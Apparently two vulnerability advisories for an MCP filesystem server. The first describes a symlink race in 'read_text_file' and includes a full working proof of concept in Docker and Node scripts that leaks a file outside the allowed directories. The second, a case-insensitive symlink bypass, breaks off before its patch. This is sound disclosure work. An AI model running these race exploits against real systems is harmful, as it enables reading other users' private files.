### Summary

In `@modelcontextprotocol/server-filesystem` 2.1.0, `read_text_file` validates the requested path and then opens it again by name. A local process that can rename a directory inside an allowed directory can swap that directory for a symlink between the check and the open. When the swap wins, the server returns the contents of a file outside `allowedDirectories`. In a two-user Linux test, an attacker user who gets `EACCES` reading the target file directly received its unknown random contents through the server.

### Details

### Affected version

- npm `@modelcontextprotocol/server-filesystem@2.1.0` (current `latest`, published 2026-10-28). Tarball SHA-256 `65aba6b962efa7fdfdd51d70b48c06e7786c8bbc57292520dec21924836031df`.
- Source: commit `194cc86e3ae6400958555bd4116849d822d69263` (monorepo tag `v2.2.0`; `src/filesystem/package.json` is `2.1.0`).
- Tested on Linux (`node:24-alpine` container) and macOS (Node 26.10.0) against the published stdio server.

### Root cause

- `read_text_file` calls `validatePath(args.path, allowedDirectories)` and then `readFileContent(validPath)` (`src/filesystem/server.ts:257-274`; `dist/server.js:190-203`).
- `validatePath` resolves `realpath` at that moment and returns a path string (`src/filesystem/lib.ts:508-518`; `dist/lib.js:330-337`).
- `readFileContent` calls `fs.readFile(filePath)` (`src/filesystem/lib.ts:556-560`; `dist/lib.js:371-372`), which resolves every path component again. A directory symlink introduced after validation is followed.

The 2.0.1 fix for GHSA-53mr-w429-c597 anchors writes to the validated directory: `write_file`, `edit_file`, `create_directory` and `move_file` go through `pinned-directory.ts` (`createFileInDirectory`, `overwriteFileInDirectory`, `renameIntoDirectory`, ...). The read path was not given that anchor, so the same check-then-use gap remains on reads. The `head`/`tail` variants of the same tool (`headFile`, `tailFile`) also open by path name.

### Preconditions

- The attacker can rename or replace a directory inside an allowed directory while the server runs (the same precondition as GHSA-53mr-w429-c597).
- The attacker controls the MCP client or can induce repeated `read_text_file` calls naming a path under that directory.
- The target file is readable by the server's user and its name is known.

### Proof of concept

### Reproduction (two OS users, Linux container)

The harness runs the published server as UID 1001 and the MCP client plus a racer as UID 1002. A root launcher creates:
- `allowed/` (owned by the attacker), passed to the server as its only allowed directory, containing `allowed/flip/marker.txt` with a benign value;
- `outside/` (owned by the server user, mode `0700`) containing `outside/marker.txt` (mode `0600`) with a fresh random 24-byte secret.

The launcher only creates the fixture and pipes MCP stdio bytes between the two processes. The attacker client is never given the secret; it only knows the `CANARY_OUTSIDE_` prefix. The client:
1. confirms a direct read of `outside/marker.txt` fails with `EACCES`;
2. checks controls through the server: the direct outside path is denied, a static symlink `allowed/flip -> outside` is denied, and the inside path returns the benign value;
3. starts a racer that repeatedly swaps `allowed/flip` between the real directory and a symlink to `outside/`, while sending `read_text_file` for `allowed/flip/marker.txt` in batches of 100.

After the client exits, the launcher compares the SHA-256 of the secret it wrote with the SHA-256 of the content the client received.

Save the three files below in one directory and run `sh run.sh` (needs Docker).

`run.sh`
```sh
#!/bin/sh
# Runs the two-user reproduction against the published package in a disposable container.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
NAME="mcp-fs-read-race-$$"
trap 'docker stop -t 1 "$NAME" >/dev/null 2>&1 || true' EXIT
docker run -d --rm --name "$NAME" node:24-alpine sleep 600 >/dev/null
docker exec "$NAME" sh -c 'mkdir -p /labpkg /labharness && cd /labpkg && npm install --no-audit --no-fund @modelcontextprotocol/server-filesystem@2.1.0 >/dev/null'
docker cp "$HERE/launcher.mjs" "$NAME:/labharness/launcher.mjs"
docker cp "$HERE/client.mjs" "$NAME:/labharness/client.mjs"
docker exec "$NAME" chmod -R a+rX /labpkg /labharness
SERVER=/labpkg/node_modules/@modelcontextprotocol/server-filesystem/dist/index.js
printf '=== No-racer control ===\n'
docker exec -e NO_RACER=1 -e MAX_CALLS=500 "$NAME" node /labharness/launcher.mjs "$SERVER"
printf '=== Two-user race ===\n'
docker exec -e NO_RACER=0 -e MAX_CALLS=20000 "$NAME" node /labharness/launcher.mjs "$SERVER"
```

`launcher.mjs`
```js
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { createHash, randomBytes } from 'node:crypto';

// Run as root only inside a disposable local container. The server is UID 1001;
// the MCP client and racer are UID 1002. All data is created under /tmp.
const victimUid = 1001;
const attackerUid = 1002;
const here = path.dirname(fileURLToPath(import.meta.url));
const root = await fs.mkdtemp(path.join(os.tmpdir(), 'mcp-two-uid-'));
const allowed = path.join(root, 'allowed');
const outside = path.join(root, 'outside');
const flip = path.join(allowed, 'flip');
const secret = 'CANARY_OUTSIDE_' + randomBytes(24).toString('hex');
await fs.mkdir(flip, { recursive: true });
await fs.mkdir(outside);
await fs.writeFile(path.join(flip, 'marker.txt'), 'BENIGN_INSIDE_TWO_UID');
await fs.writeFile(path.join(outside, 'marker.txt'), secret, { mode: 0o600 });
await fs.chmod(root, 0o755);
await fs.chown(allowed, attackerUid, attackerUid);
await fs.chmod(allowed, 0o755);
await fs.chown(flip, attackerUid, attackerUid);
await fs.chmod(flip, 0o755);
await fs.chown(path.join(flip, 'marker.txt'), attackerUid, attackerUid);
await fs.chown(outside, victimUid, victimUid);
await fs.chmod(outside, 0o700);
await fs.chown(path.join(outside, 'marker.txt'), victimUid, victimUid);
await fs.chmod(path.join(outside, 'marker.txt'), 0o600);

const pkg = process.argv[2];
if (!pkg) throw new Error('pass absolute path to published dist/index.js');
const server = spawn(process.execPath, [pkg, allowed], {
  uid: victimUid,
  gid: victimUid,
  stdio: ['pipe', 'pipe', 'pipe'],
});
const client = spawn(process.execPath, [path.join(here, 'client.mjs'), allowed, outside], {
  uid: attackerUid,
  gid: attackerUid,
  stdio: ['pipe', 'pipe', 'pipe'],
  env: { ...process.env, MAX_CALLS: process.env.MAX_CALLS ?? '20000', NO_RACER: process.env.NO_RACER ?? '0' },
});
client.stdout.pipe(server.stdin);
server.stdout.pipe(client.stdin);
server.stderr.on('data', c => process.stderr.write('[server] ' + c));
let clientLog = '';
client.stderr.on('data', c => {
  clientLog += c.toString();
  process.stderr.write('[attacker-client] ' + c);
});
const code = await new Promise(resolve => client.on('exit', resolve));
server.kill('SIGTERM');
const raceLine = clientLog.split('\n').find(line => line.startsWith('{"race":'));
let reported;
try { reported = JSON.parse(raceLine); } catch { reported = null; }
const captured = reported?.race?.first?.result?.content?.[0]?.text;
const digest = value => value === undefined ? null : createHash('sha256').update(value).digest('hex');
const noRacer = process.env.NO_RACER === '1';
const match = captured === secret;
console.log(JSON.stringify({
  root, serverUid: victimUid, attackerUid, clientExit: code,
  secretSha256: digest(secret), capturedSha256: digest(captured),
  match, expectedMatch: !noRacer,
}));
process.exitCode = (code === 0 && match === !noRacer) ? 0 : 1;
```

`client.mjs`
```js
import fs from 'node:fs/promises';
import path from 'node:path';
import { spawn } from 'node:child_process';

const [allowed, outside] = process.argv.slice(2);
const flip = path.join(allowed, 'flip');
const stash = path.join(allowed, 'stash');
const target = path.join(flip, 'marker.txt');
const forbidden = path.join(outside, 'marker.txt');
// The random suffix is generated only by the launcher and never passed here.
const secretPrefix = 'CANARY_OUTSIDE_';
const benign = 'BENIGN_INSIDE_TWO_UID';

if (process.argv[2] === '--racer') {
  const [f, s, o] = process.argv.slice(3);
  for (;;) {
    try {
      await fs.rename(f, s);
      await fs.symlink(o, f);
      await fs.unlink(f);
      await fs.rename(s, f);
    } catch {
      try { await fs.unlink(f); } catch {}
      try { await fs.rename(s, f); } catch {}
    }
  }
}

let directRead;
try {
  directRead = await fs.readFile(forbidden, 'utf8');
} catch (e) {
  directRead = `ERROR:${e.code}`;
}
if (directRead !== 'ERROR:EACCES') throw new Error(`attacker directly read outside file: ${directRead}`);
process.stderr.write(JSON.stringify({ attackerUid: process.getuid(), directRead }) + '\n');

let buffer = '';
let id = 1;
const pending = new Map();
process.stdin.on('data', chunk => {
  buffer += chunk.toString();
  for (;;) {
    const cut = buffer.indexOf('\n');
    if (cut < 0) break;
    const line = buffer.slice(0, cut); buffer = buffer.slice(cut + 1);
    if (!line.trim()) continue;
    let msg;
    try { msg = JSON.parse(line); } catch { continue; }
    if (!('id' in msg)) continue;
    const callback = pending.get(msg.id);
    if (callback) { pending.delete(msg.id); callback(msg); }
  }
});
function send(method, params) {
  const requestId = id++;
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error(`MCP timeout ${requestId}`)), 30000);
    pending.set(requestId, msg => { clearTimeout(timer); resolve(msg); });
    process.stdout.write(JSON.stringify({ jsonrpc: '2.0', id: requestId, method, params }) + '\n');
  });
}
function result(m) { return JSON.stringify(m.result?.content ?? m.error ?? m); }
const init = await send('initialize', {
  protocolVersion: '2025-11-25',
  capabilities: {},
  clientInfo: { name: 'two-uid-owned-lab', version: '1.0.0' },
});
if (init.error) throw new Error(JSON.stringify(init.error));
process.stdout.write(JSON.stringify({ jsonrpc: '2.0', method: 'notifications/initialized' }) + '\n');
const read = p => send('tools/call', { name: 'read_text_file', arguments: { path: p } });
const direct = result(await read(forbidden));
const inside = result(await read(target));
await fs.rename(flip, stash);
await fs.symlink(outside, flip);
const staticLink = result(await read(target));
await fs.unlink(flip);
await fs.rename(stash, flip);
if (direct.includes(secretPrefix) || !direct.includes('Access denied') ||
    !inside.includes(benign) || staticLink.includes(secretPrefix) || !staticLink.includes('Access denied')) {
  throw new Error(`control failed: ${JSON.stringify({ direct, inside, staticLink })}`);
}
process.stderr.write(JSON.stringify({ controls: 'PASS', version: init.result?.serverInfo?.version }) + '\n');

let racer;
if (process.env.NO_RACER !== '1') {
  racer = spawn(process.execPath, [new URL(import.meta.url).pathname, '--racer', flip, stash, outside], {
    stdio: ['ignore', 'ignore', 'pipe'],
  });
}
const maxCalls = Number(process.env.MAX_CALLS ?? 20000);
let total = 0, leaks = 0, benignReads = 0, denials = 0, other = 0, first = null;
try {
  while (total < maxCalls && leaks === 0) {
    const batch = Math.min(100, maxCalls - total);
    const messages = await Promise.all(Array.from({ length: batch }, () => read(target)));
    total += batch;
    for (const message of messages) {
      const text = result(message);
      if (text.includes(secretPrefix)) { leaks++; first ??= message; }
      else if (text.includes(benign)) benignReads++;
      else if (text.includes('Access denied') || text.includes('ENOENT')) denials++;
      else other++;
    }
  }
} finally {
  racer?.kill('SIGTERM');
}
process.stderr.write(JSON.stringify({ race: { noRacer: process.env.NO_RACER === '1', total, leaks, benignReads, denials, other, first } }) + '\n');
if (process.env.NO_RACER === '1' && leaks !== 0) process.exitCode = 1;
if (process.env.NO_RACER !== '1' && leaks === 0) process.exitCode = 2;
process.exit(process.exitCode ?? 0);
```

### Results

Output of `run.sh` above (2026-10-30, macOS host, `node:24-alpine` container, package installed from npm):

```
=== No-racer control ===
[attacker-client] {"attackerUid":1002,"directRead":"ERROR:EACCES"}
[attacker-client] {"controls":"PASS","version":"2.1.0"}
[attacker-client] {"race":{"noRacer":true,"total":500,"leaks":0, ...}}
=== Two-user race ===
[attacker-client] {"attackerUid":1002,"directRead":"ERROR:EACCES"}
[attacker-client] {"controls":"PASS","version":"2.1.0"}
[attacker-client] {"race":{"noRacer":false,"total":200,"leaks":13, ... "text":"CANARY_OUTSIDE_64a6e0d58b6131d90540f56ea4203a68be70e6f39680a0b8" ... "id":105}}
{"serverUid":1001,"attackerUid":1002,"secretSha256":"bbf3e06d760cc0b7f74d2df8aa995e9d1e21784f57ec7d0b245dd90eba7ea03f","capturedSha256":"bbf3e06d760cc0b7f74d2df8aa995e9d1e21784f57ec7d0b245dd90eba7ea03f","match":true}
```

| Run | Calls | Outside content returned | No-racer control |
| --- | --- | --- | --- |
| Two users, unknown random secret (`run.sh` above) | 200 | 13 | 0 of 500 |
| Two users, unknown random secret (earlier run) | 200 | 3 | 0 of 500 |
| Two users, fixed canary | 200 | 10 | 0 of 500 |
| Two users, fixed canary (repeat) | 200 | 25 | 0 of 500 |
| Same user, macOS | 1,300 | 23 | 0 of 900 |
| Same user, macOS (repeat) | 1,100 | 8 | 0 of 200 |

In every run, the direct outside path and a static outside symlink were refused. Leaks appeared only while the racer was running.

The README's note that allowed-directory checks are path-based (the hard-link caveat) does not cover this: in the two-user fixture the attacker cannot traverse the `0700` `outside/` directory, so it cannot create a link to the file. The server returns the file only by following the swapped directory.

### Impact

The server returns file contents from outside its configured allowed directories to the MCP client, breaking the boundary the README states ("filesystem operations are restricted to allowed directories"). Where the server runs as a user that can read files that the people able to write the allowed tree cannot, this also crosses an OS-user boundary, as demonstrated above. The attack is a race and needs repeated calls; a single call is not reliable.

Suggested CVSS 3.1: `AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N` (4.4).

### Suggested fix

Bind the check to the file actually read: open the final component relative to the pinned, validated parent directory (as `pinned-directory.ts` already does for writes) with `O_NOFOLLOW`, confirm the descriptor is the expected regular file, and read through that descriptor. Apply the same to `headFile`, `tailFile` and the other read handlers that open by path. A second path-based `realpath` check would leave another window.

### Summary

On a case-insensitive file system, `server-filesystem` 2026.8.31, 1.0.0 and 2.0.0 create files and directories outside the allowed directories through `create_directory`, `write_file` and the destination of `move_file`, if an allowed directory contains a symlink that points out and the request spells the symlink's name with different letter case. `resolveUnicodeEquivalentPath()` compares path components with `fs.readdir()` entries as strings, so `LINK` does not match `link`; it returns the rest of the path without a `realpath()`, and the OS follows the symlink when it creates the file.

macOS (APFS) and Windows (NTFS) are case-insensitive by default. I reproduced this on Linux with a case-folded tmpfs and have not run it on macOS or Windows. Only new files and directories can be created, existing files outside stay protected. It is a regression: 2026.7.10 refuses these requests.

### Details

`validatePath()` first calls `fs.realpath()` on the requested path. For a path that does not exist yet this fails with `ENOENT`, and `validatePath()` hands over to `resolveUnicodeEquivalentPath()` ([lib.ts#L256-L258](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/filesystem/lib.ts#L256-L258)). That function starts at the real path of the allowed directory and walks the requested path one component at a time ([lib.ts#L157-L191](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/filesystem/lib.ts#L157-L191)):

```ts
const entries = (await fs.readdir(currentPath)) ?? [];
const exactMatch = entries.find((entry) => entry === requestedPart);
const equivalentMatches = exactMatch
  ? [exactMatch]
  : entries.filter(
      (entry) => unicodeMatchKey(entry) === unicodeMatchKey(requestedPart),
    );
...
if (equivalentMatches.length === 0) {
  // Nothing below this point exists yet, so there are no symlinks left to
  // resolve. ...
  return path.join(currentPath, ...relativeParts.slice(index));
}
```

([lib.ts#L159-L176](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/filesystem/lib.ts#L159-L176).) For an entry that matches, the loop runs `fs.realpath()` and checks the result against the allowed directories. The matching is a string comparison: `unicodeMatchKey` ([lib.ts#L100-L102](https://github.com/modelcontextprotocol/servers/blob/51b6382a3e827aceb6bce430b1208d69b93d95ea/src/filesystem/lib.ts#L100-L102)) normalizes to NFC and maps Unicode spaces to U+0020 but keeps letter case. So with a symlink `link -> /outside` in the allowed directory, a request for `LINK/a` finds no entry called `LINK`, the function returns `<allowed>/LINK/a` unchecked, and on a case-insensitive file system `mkdir` or `open` resolves `LINK` through `link`.

The case-varied component does not have to be the symlink. In `SUB/ln2/x`, with `sub/ln2 -> /outside`, the walk stops at `SUB` and never looks at `ln2`, even though `ln2` is spelled exactly. So a fix that checks only the first missing component is not enough.

History: before 2026.8.31 `validatePath()` ran `fs.realpath()` on the parent directory, so the OS did the case folding and `LINK/a` was refused. PR #4638 replaced that with the `readdir` walk; there, an unmatched component that was not the last one still raised "Parent directory does not exist". PR #4631 (issue #4629), merged on top of it, changed that branch to return the unchecked rest of the path so that `create_directory` can create nested directories. Both first shipped in 2026.8.31. The existing symlink test (`refuses a new path under a symlinked directory that leaves (#4629)`) uses the exact spelling only. The class is the one in GHSA-q66q-fx2p-7w4m (CVE-2025-53109): reaching files outside the allowed directories through symlinks inside them.

Suggested fix: when no entry matches by spelling, pass the requested name to `fs.realpath()` as it is, so the OS applies whatever case folding or aliasing the file system has, and check containment at every step. Only a name that neither resolves nor exists under `lstat` is treated as the start of the missing tail. A dangling symlink still fails like it does today. I have this as a patch with tests (the `lib.ts` change is below, the tests are in `server-paths.test.ts`) and can open a PR against the private fork:

